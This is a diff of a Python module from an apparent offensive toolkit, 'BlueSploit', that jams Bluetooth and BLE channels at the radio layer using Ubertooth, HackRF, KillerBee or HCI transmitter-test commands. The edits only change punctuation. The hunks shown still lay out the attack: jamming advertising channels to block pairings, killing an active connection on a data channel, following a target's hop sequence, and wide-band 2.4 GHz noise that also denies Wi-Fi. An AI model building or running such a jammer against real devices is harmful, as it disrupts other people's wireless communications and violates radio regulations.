@@ -3,29 +3,29 @@ BlueSploit DoS: PHY-Level Bluetooth Channel Jamming
 
 PHY-layer denial of service against BLE/Classic Bluetooth by transmitting
 continuous noise or constant carrier on Bluetooth channel frequencies. Unlike
-upper-layer floods (l2ping, sdp_flood), this attacks the radio link itself —
+upper-layer floods (l2ping, sdp_flood), this attacks the radio link itself -
 no Bluetooth stack on the target needs to cooperate.
 
 Methods supported:
-  ubertooth — Ubertooth One in JamBT mode (channel-specific or FH-following)
-  hackrf    — HackRF transmits a constant carrier or PRN noise on channel center
-  killerbee — KillerBee TI CC2531/CC2540 sniffer in jammer mode
-  hci_loop  — Pseudo-jam: saturate adjacent channels with HCI test commands
+  ubertooth, Ubertooth One in JamBT mode (channel-specific or FH-following)
+  hackrf   , HackRF transmits a constant carrier or PRN noise on channel center
+  killerbee, KillerBee TI CC2531/CC2540 sniffer in jammer mode
+  hci_loop , Pseudo-jam: saturate adjacent channels with HCI test commands
 
 Channel layouts:
   BLE advertising  : channels 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz)
-  BLE data         : channels 0–36 (2404–2478 MHz, 2 MHz spacing)
-  Classic BT       : 79 channels 0–78 (2402–2480 MHz, 1 MHz spacing) FH-AFH
+  BLE data         : channels 0-36 (2404-2478 MHz, 2 MHz spacing)
+  Classic BT       : 79 channels 0-78 (2402-2480 MHz, 1 MHz spacing) FH-AFH
 
 Modes:
-  adv_only       — Jam only the 3 BLE advertising channels (prevent new pairings)
-  data_chan      — Jam a specific data channel (kill an active connection)
-  full_band      — Wide-band noise across 2.4 GHz ISM band (denies all BT/WiFi 1,6,11)
-  follow         — Follow a target connection's hop sequence and jam each used channel
+  adv_only      , Jam only the 3 BLE advertising channels (prevent new pairings)
+  data_chan     , Jam a specific data channel (kill an active connection)
+  full_band     , Wide-band noise across 2.4 GHz ISM band (denies all BT/WiFi 1,6,11)
+  follow        , Follow a target connection's hop sequence and jam each used channel
 
 CWE: CWE-400 (Resource Exhaustion), CWE-770 (Allocation of Resources Without Limits)
 
-Note: Wide-band jamming may be illegal in your jurisdiction — only operate in
+Note: Wide-band jamming may be illegal in your jurisdiction, only operate in
 RF-shielded test environments or with appropriate experimental licensing.
 """
 
@@ -70,7 +70,7 @@ class Module(DosModule):
         name="PHY-Level Bluetooth Jamming",
         description=(
             "Radio-layer denial of Bluetooth/BLE channels via Ubertooth, HackRF, "
-            "or KillerBee — kills connections and prevents new pairings"
+            "or KillerBee, kills connections and prevents new pairings"
         ),
         author=["BlueSploit"],
         protocol=BTProtocol.BOTH,
@@ -99,7 +99,7 @@ class Module(DosModule):
         self.add_option(ModuleOption(
             name="channel",
             required=False,
-            description="BLE channel 0–39 (data_chan/follow mode)",
+            description="BLE channel 0-39 (data_chan/follow mode)",
             default=37,
         ))
         self.add_option(ModuleOption(
@@ -123,7 +123,7 @@ class Module(DosModule):
         self.add_option(ModuleOption(
             name="tx_gain",
             required=False,
-            description="HackRF TX gain (0–47)",
+            description="HackRF TX gain (0-47)",
             default=40,
         ))
         self.add_option(ModuleOption(
@@ -146,19 +146,19 @@ class Module(DosModule):
 
         # Verify hardware availability
         if method == "ubertooth" and not _has("ubertooth-btle"):
-            print_error("ubertooth-btle not found — install ubertooth-utils")
+            print_error("ubertooth-btle not found, install ubertooth-utils")
             return False
         if method == "hackrf" and not _has("hackrf_transfer"):
-            print_error("hackrf_transfer not found — install hackrf")
+            print_error("hackrf_transfer not found, install hackrf")
             return False
         if method == "killerbee" and not _has("zbstumbler"):
-            print_warning("KillerBee tools not found — install python-killerbee")
+            print_warning("KillerBee tools not found, install python-killerbee")
 
         if mode == "follow" and not self.get_option("target"):
             print_error("follow mode requires target BD_ADDR")
             return False
 
-        print_success(f"Pre-flight OK — method={method} mode={mode}")
+        print_success(f"Pre-flight OK, method={method} mode={mode}")
         return True
 
     def run(self) -> bool:
@@ -211,7 +211,7 @@ class Module(DosModule):
             print_info(f"Following {target} via Ubertooth and jamming hop channels")
             return self._ubertooth_follow_jam(target, duration, device)
         else:
-            print_error("full_band not supported by Ubertooth — use HackRF")
+            print_error("full_band not supported by Ubertooth, use HackRF")
             return False
 
         # Cycle through channels rapidly to jam all of them
@@ -240,7 +240,7 @@ class Module(DosModule):
         for t in threads:
             t.start()
 
-        print_success(f"Jamming {len(channels)} channel(s) — Ctrl+C to stop")
+        print_success(f"Jamming {len(channels)} channel(s), Ctrl+C to stop")
         start = time.time()
         try:
             while True:
@@ -399,7 +399,7 @@ class Module(DosModule):
         return True
 
     def _hackrf_wideband(self, duration: int, device: str, tx_gain: int) -> bool:
-        """Wide-band 2.4 GHz noise — single TX centered at 2440 MHz, 80 MHz BW."""
+        """Wide-band 2.4 GHz noise, single TX centered at 2440 MHz, 80 MHz BW."""
         noise_file = "/tmp/bluesploit_noise_wb.iq"
         if not os.path.isfile(noise_file):
             print_info("Generating 32MB wide-band noise file...")
@@ -450,7 +450,7 @@ class Module(DosModule):
         """Use KillerBee TI sniffer in jam mode (zbreplay/zbassocflood-style)."""
         print_info("KillerBee TI radio jamming on channel center frequency")
 
-        # zbstumbler with continuous TX hack — actual jammer requires firmware mod
+        # zbstumbler with continuous TX hack, actual jammer requires firmware mod
         cmd = ["zbstumbler", "-i", device]
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
@@ -469,7 +469,7 @@ class Module(DosModule):
             finally:
                 proc.terminate()
         except FileNotFoundError:
-            print_error("zbstumbler not found — install python-killerbee")
+            print_error("zbstumbler not found, install python-killerbee")
             return False
 
         print()
@@ -493,7 +493,7 @@ class Module(DosModule):
         # HCI LE Receiver/Transmitter Test commands need raw HCI
         # We use hcitool to send LE_Transmitter_Test (OGF=0x08, OCF=0x001E)
         print_info(f"Using HCI LE Transmitter Test on channels {test_channels}")
-        print_warning("This uses standard HCI test mode — limited TX power vs. dedicated SDR")
+        print_warning("This uses standard HCI test mode, limited TX power vs. dedicated SDR")
 
         active_chs = []
         try:
@@ -516,10 +516,10 @@ class Module(DosModule):
                     print_warning(f"  TX test failed on ch {ch}: {r.stderr[:80]}")
 
             if not active_chs:
-                print_error("Could not enable any TX tests — adapter may not support test mode")
+                print_error("Could not enable any TX tests, adapter may not support test mode")
                 return False
 
-            print_success(f"HCI TX test active on {len(active_chs)} channels — Ctrl+C to stop")
+            print_success(f"HCI TX test active on {len(active_chs)} channels, Ctrl+C to stop")
             start = time.time()
             try:
                 while True:
